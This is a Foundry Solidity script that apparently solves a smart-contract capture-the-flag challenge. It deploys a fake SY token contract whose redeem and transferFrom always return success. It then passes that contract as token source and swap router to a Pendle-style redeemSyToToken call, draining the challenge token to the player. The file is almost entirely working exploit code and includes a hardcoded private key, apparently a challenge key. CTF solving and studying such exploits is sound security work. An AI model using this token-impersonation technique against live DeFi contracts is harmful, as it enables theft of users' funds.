// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import "src/Challenge.sol";

struct TokenOutput {
    // Token/Sy data
    address tokenOut;
    uint256 minTokenOut;
    address tokenRedeemSy;
    // aggregator data
    address pendleSwap;
    SwapData swapData;
}

struct SwapData {
    SwapType swapType;
    address extRouter;
    bytes extCalldata;
    bool needScale;
}

enum SwapType {
    NONE,
    KYBERSWAP,
    ONE_INCH,
    // ETH_WETH not used in Aggregator
    ETH_WETH
}

contract SwapAgg {

}

contract SYToken {
    function redeem(address, uint256, address, uint256, bool) external returns (uint256) {
        return 1000e18;
    }

    function transferFrom(address, address, uint256) external returns (bool){
        return true;
    }

    function swap(address tokenIn, uint256 amountIn, SwapData calldata swapData) external payable {

    }
}

interface IPendle {
    function redeemSyToToken(
        address receiver,
        address SY,
        uint256 netSyIn,
        TokenOutput calldata output
    ) external returns (uint256 netTokenOut);
}

contract Solution is Script {
    function run() external {
        
        uint256 privateKey = 0xe5139d11b839c45e828f3c3fd6b2c2e0b11a16aa96d53436521cc612a3d46f6d;
        vm.startBroadcast(privateKey);

        Challenge challenge = Challenge(0x43fb730c44f030be579B465D65eBA6E51fCF8C47);


        SYToken sy = new SYToken();

        IPendle(0x00000000005BBB0EF59571E58418F9a4357b68A0).redeemSyToToken(
            challenge.PLAYER(),
            address(sy),
            1000e18,
            TokenOutput(
                address(challenge.token()), 
                1000e18, 
                address(challenge.token()), 
                address(sy), 
                SwapData(SwapType.KYBERSWAP, address(sy), "", false)
            ) 
        );


        vm.stopBroadcast();
    }
}
